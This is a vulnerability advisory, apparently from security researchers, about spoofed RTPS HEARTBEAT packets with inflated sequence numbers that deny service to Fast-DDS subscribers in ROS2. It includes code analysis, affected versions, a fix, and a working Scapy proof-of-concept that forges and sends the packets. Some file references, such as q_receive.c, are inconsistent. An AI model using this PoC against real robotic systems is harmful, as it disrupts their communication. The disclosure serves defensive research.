
# 1. Attack Summary

- **Preconditions**
    - Among ROS2 communication protocols, QoS must be in a state of operating in Reliable mode. 
    
            If the RoS policy is Reliable Mode, Request missing messages again based on Heartbeat packets (Acknack).
    
    - The attacker must exist on the network where the publisher and subscriber communicate and be able to intercept existing communication flow through packet sniffing.
        
        
- **Attack Details**
    - The attacker sniffs the RTPS packet between Publisher (Talker) and Subscriber (Listener) and then uses the Scapy tool to spoof the value of 'guid-prefix, src IP, dst IP, sport, dport, submessageID: HEARTBEAT (flag, octetsToNextHeader, reader/writerEntityId).
    - Subsequently, the Sequence Number within the Heartbeat message is maliciously manipulated to a very high Sequence Number and resent to the Subscriber. As a result, all data sent from the Publisher to the Subscriber is lost.
        - 1,2,3,4... If an attacker manipulates the increasing Sequence Number to 50 and then sends a packet, the Subscriber does not receive the data content from 5 to 49 and lost it, and receives  normal data after 50.
    - The attacked Subscriber cannot receive the Publisher's data afterward.
 
<br/>

# 2. Vulnerability Cause

### Code Analysis

1. **process_heartbeat()**
    - eProsima/Fast-DDS/blob/2.12.0/src/cpp/rtps/reader/WriterProxy.cpp : #550
    - Compares the order or count of the current Heartbeat **`count`** and the previous Heartbeat **`last_heartbeat_count_`** to determine if the current Heartbeat message is new, or if it is the same as or older than the one previously received.
    ```c
	bool WriterProxy::process_heartbeat(
	        uint32_t count,
	        const SequenceNumber_t& first_seq,
	        const SequenceNumber_t& last_seq,
	        bool final_flag,
	        bool liveliness_flag,
	        bool disable_positive,
	        bool& assert_liveliness,
	        int32_t& current_sample_lost)
	{
	#ifdef SHOULD_DEBUG_LINUX
	    assert(get_mutex_owner() == get_thread_id());
	#endif // SHOULD_DEBUG_LINUX
	
	    assert_liveliness = false;
            #565
	    if (state_ != StateCode::STOPPED && last_heartbeat_count_ < count)
	    {
	        // If it is the first heartbeat message, we can try to cancel initial ack.
	        // TODO: This timer cancelling should be checked if needed with the liveliness implementation.
	        // To keep PARTICIPANT_DROPPED event we should add an explicit participant_liveliness QoS.
	        // This is now commented to avoid issues #457 and #155
	        // initial_acknack_->cancel_timer();
	
	        last_heartbeat_count_ = count;
	        current_sample_lost = lost_changes_update(first_seq);
	        missing_changes_update(last_seq);
	        heartbeat_final_flag_.store(final_flag);
	
	        //Analyze whether a acknack message is needed:
	        if (!is_on_same_process_)
	        {
	            if (!final_flag)
	            {
	                if (!disable_positive || are_there_missing_changes())
	                {
	                    heartbeat_response_->restart_timer();
	                }
	            }
	            else if (final_flag && !liveliness_flag)
	            {
	                if (are_there_missing_changes())
	                {
	                    heartbeat_response_->restart_timer();
	                }
	            }
	            else
	            {
	                assert_liveliness = liveliness_flag;
	            }
	        }
	        else
	        {
	            assert_liveliness = liveliness_flag;
	        }
	
	        if (!received_at_least_one_heartbeat_)
	        {
	            current_sample_lost = 0;
	            received_at_least_one_heartbeat_ = true;
	        }
	
	        return true;
	    }
	
	    return false;
	}
    ```   
<br/>

2. **processHeartbeatMsg()**
    - eProsima/Fast-DDS/blob/2.12.0/src/cpp/rtps/reader/StatefulReader.cpp: #784
    - Within the processHeartbeatMsg function, only if the validity check for return of function **`writer->process_heartbeat()`**. 
    ```c
    #784
    bool StatefulReader::processHeartbeatMsg(
	const GUID_t& writerGUID,
	uint32_t hbCount,
	const SequenceNumber_t& firstSN,
	const SequenceNumber_t& lastSN,
	bool finalFlag,
	bool livelinessFlag)
	{
	    WriterProxy* writer = nullptr;
	
	    std::unique_lock<RecursiveTimedMutex> lock(mp_mutex);
	    if (!is_alive_)
	    {
	        return false;
	    }
	
	    if (acceptMsgFrom(writerGUID, &writer) && writer)
	    {
	        bool assert_liveliness = false;
	        int32_t current_sample_lost = 0;
    		#804
	        if (writer->process_heartbeat(
	                    hbCount, firstSN, lastSN, finalFlag, livelinessFlag, disable_positive_acks_, assert_liveliness,
	                    current_sample_lost))
	        {
	            mp_history->remove_fragmented_changes_until(firstSN, writerGUID);
	
	            if (0 < current_sample_lost)
	            {
	                if (getListener() != nullptr)
	                {
	                    getListener()->on_sample_lost((RTPSReader*)this, current_sample_lost);
	                }
	            }
	
	            // Maybe now we have to notify user from new CacheChanges.
	            NotifyChanges(writer);
	
	            // Try to assert liveliness if requested by proxy's logic
	            if (assert_liveliness)
	            {
	                if (liveliness_lease_duration_ < c_TimeInfinite)
	                {
	                    if (liveliness_kind_ == MANUAL_BY_TOPIC_LIVELINESS_QOS ||
	                            writer->liveliness_kind() == MANUAL_BY_TOPIC_LIVELINESS_QOS)
	                    {
	                        auto wlp = this->mp_RTPSParticipant->wlp();
	                        if ( wlp != nullptr)
	                        {
	                            lock.unlock(); // Avoid deadlock with LivelinessManager.
	                            wlp->sub_liveliness_manager_->assert_liveliness(
	                                writerGUID,
	                                liveliness_kind_,
	                                liveliness_lease_duration_);
	                        }
	                        else
	                        {
	                            EPROSIMA_LOG_ERROR(RTPS_LIVELINESS, "Finite liveliness lease duration but WLP not enabled");
	                        }
	                    }
	                }
	            }
	        }
	
	        return true;
	    }
	
	    return false;
	}
    ```   

<br/>

# 3. Vulnerability Impact

- Looking at the logic of heartbeat processing in the q_receive.c file, `There is no validation for Heartbeat Sequence Number.`
- If an attacker arbitrarily includes a very high sequence number (e.g., 999999) in the HeartBeat message and sends it to the Subscriber, the Subscriber will `repeatedly send` an Acknack response to the Publisher that sent the sequence number (e.g., 999999).
- However, `actually, the missing messages (Heartbeat Sequence Number=99999) do not exist, which can result in a Denial of Service (DoS) condition in the system.`

<p align="center"><img src="https://github.com/BOB12thCVEIssacGleaning/CVEIssacGleaning/assets/63354563/5929aa1f-799a-4f9b-9308-167e535356b5" width="800" height="550"/>


  ## 3.1. Affected Version

- **Commint Analysis**
    - eProsima/Fast-DDS/blob/2.12.0/src/cpp/rtps/reader/WriterProxy.cpp
    - Since the initial commit of the q_receive.c code (Valid Heartbeat function) on Apr 11, 2018, Heartbeat Sequence Attack Vulnerabilities have been present up to the current date.
    
| COMMIT TIME | COMMIT ID | Issue |
|:---:|:---:|:---:|
| Jul 16, 2019 | 31512910db8c029b6164457c3609c5e6c8f86506 | Initial Contribution |
| Apr  3, 2023 | c40a4c19cd85739b6f40de1b5ad5d76ef5077954 | latest Contribution |


<br/>

# 4. Test Environment + PoC

- **Attack Environment Required Info**
    - Operating System : Ubuntu 22.04 LTS
    - ROS2 IRON FastDDS - 2 Docker environments (172.17.0.2, 172.17.0.3)
- **Attack Description**
    - **[Attacker]** Uses the scapy tool to include a random very high Sequence Number (ex. 999999) in a HeartBeat message and sends it to the Subscriber (Listener).
    - **[victim]**  The Subscriber (listener) does not receive the data sent by the publisher until the Sequence Number is 999999.

![image](https://github.com/BOB12thCVEIssacGleaning/CVEIssacGleaning/assets/146199020/5fa3e2aa-2229-4c88-9115-d41a15eba89e)


## 4.1. POC (Proof of concept)

```python
from scapy.all import *
from scapy.contrib.rtps import *

# RTPS Header
class RTPS(Packet):
    name = "RTPS Header"
    fields_desc = [
        XIntField("magic", 0x52545053),  # RTPS in hex
        XByteField("major", 2),
        XByteField("minor", 3),
        XShortField("vendor_id", 0x010f),
        XIntField("hostId", 0x010feb7d),
        XIntField("appId", 0x9b0014a9),
        XIntField("instanceId", 0x00000000)
    ]
 

class RTPSSubMessage_HEARTBEAT(Packet):
    name = "RTPS HEARTBEAT"
    fields_desc = [
        XByteField("submessageId", 0x07),
        XByteField("flags", 0x01),
        XShortField("octetsToNextHeader", 0x1c00),
        X3BytesField("readerEntityIdKey", 0x000012),
        XByteField("readerEntityIdKind", 0x04),
        X3BytesField("writerEntityIdKey", 0x000012),
        XByteField("writerEntityIdKind", 0x03),
        LongField("firstAvailableSeqNumber", 0xf423f00),  # Use LELongField here
        LongField("lastSeqNumber", 0xf423f00),           # Use LELongField here
        XIntField("count", 0xf423f00)
    ]

for _ in range(2):  
	packet = Ether(src="02:42:ac:11:00:02" ,dst="02:42:ac:11:00:03") / \
		IP(src="172.17.0.2",dst="172.17.0.3") / \
		UDP(sport=33524, dport=7411) / RTPS() / RTPSSubMessage_HEARTBEAT()
	sendp(packet, iface="docker0")
```

## 4.2. Attack Outcome
- **QoS - `Reliable Pub/Sub`**
    - [Reliable Publisher] Talker → [Reliable Subscriber] Listener
      
|ROS2 Version|FastDDS|RMW - FastDDS|Attack Result|
|:---:|:---:|:---:|:---:|
|IRON|2.10.2-1|7.1.1-2|O|
|HUMBLE|2.6.6-1|6.2.3.1|O|
|GALACTIC|2.3.6-6|5.0.2-1|O|
|FOXY|2.1.4-1|1.3.2-1|O|

<br/>

# 5. Recommendations

- **A code must exist to verify the sequential increase in Seqenunce.**
    - ex) example code
    - When the previous sequence number is saved and the value of the currently incoming sequence number is not the same as the previous sequence number +1, it must be processed as a malformed packet.
    - **`prevSeqN`** in the code below is heartbeat last sequence number of the prior heartbeat packet and **`last_seq`** is last sequence number of the current heartbeat packet.
    ```c
    #eProsima/Fast-DDS/blob/2.12.0/src/cpp/rtps/reader/WriterProxy.cpp : #565
    if (state_ != StateCode::STOPPED && last_heartbeat_count_ < count && last_seq == prevSeqN + 1)
    ```
